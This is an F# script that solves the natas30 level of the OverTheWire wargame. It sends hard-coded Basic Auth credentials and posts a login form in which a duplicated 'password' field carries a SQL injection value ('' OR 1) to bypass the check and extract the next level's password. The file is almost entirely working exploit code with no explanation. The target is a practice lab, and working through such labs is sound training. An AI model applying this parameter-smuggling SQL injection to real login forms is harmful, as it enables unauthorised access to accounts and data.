open System
open System.Net
open System.IO

let url = "http://natas30.natas.labs.overthewire.org/"
let credentials = "natas30:wie9iexae0Daihohv8vuu3cei9wahf0e"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let oracle form =
    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Method <- "POST"
    http.AllowAutoRedirect <- false

    let request = http.GetRequestStream()
    let body = 
        form 
        |> Seq.map (fun (key, value) -> sprintf "%s=%s" key value)
        |> String.concat "&"
        |> Seq.map byte |> Seq.toArray
    request.Write(body, 0, body.Length)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    reader.ReadToEnd ()

oracle [
    "username", "natas30"
    "password", "'' OR 1"
    "password", "4"
    ]
|> fun s -> s.[s.IndexOf("</form>") + 7..s.IndexOf("<div id=\"viewsource\">") - 1]
|> printfn "%s"